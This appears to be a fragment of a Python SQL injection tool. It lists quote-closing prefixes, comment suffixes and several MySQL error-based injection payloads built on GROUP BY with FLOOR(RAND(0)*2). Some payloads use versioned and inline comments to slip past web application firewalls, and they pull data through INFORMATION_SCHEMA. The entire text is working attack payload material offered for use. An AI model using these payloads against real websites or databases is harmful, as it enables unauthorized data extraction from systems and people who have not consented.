...
PREFIXES, SUFIXES = (" ", "' ", '" ', ") ", "') "),("", "OR+1", "--+-", "%23")

# Test Queries for extractvalue()
TESTS = ("OR 1 GROUP BY CONCAT(0x7e,"+str(Str1)+",FLOOR(RAND(0)*2))HAVING(MIN(0))",
         "OR 1 GROUP BY CONCAT/**_**/(0x7e,"+str(Str1)+",FLOOR(RAND(0)*2))HAVING(MIN(0))",
		     "AND (/*!50000SELECT*/ 4109 /*!50000FROM*/(/*!50000SELECT*/ COUNT(*),CONCAT/**_**/(0x7e,"+str(Str1)+",FLOOR(RAND(0)*2))x /*!50000FROM*/ /*!50000INFORMATION_SCHEMA.PLUGINS*/ GROUP BY x)a)",
         "AND (SELECT 4109 FROM(SELECT COUNT(*),CONCAT(0x7e,"+str(Str1)+",FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
         "AND (/*!50000SELECT*/ 9080 /*!50000FROM*/(/*!50000SELECT*/ COUNT(*),CONCAT/**_**/(0x7e,"+str(Str1)+",FLOOR(RAND(0)*2))x /*!50000FROM*/ /*!50000INFORMATION_SCHEMA.CHARACTER_SETS*/ GROUP BY x)a)",
         "AND (SELECT 9080 FROM(SELECT COUNT(*),CONCAT(0x7e,"+str(Str1)+",FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
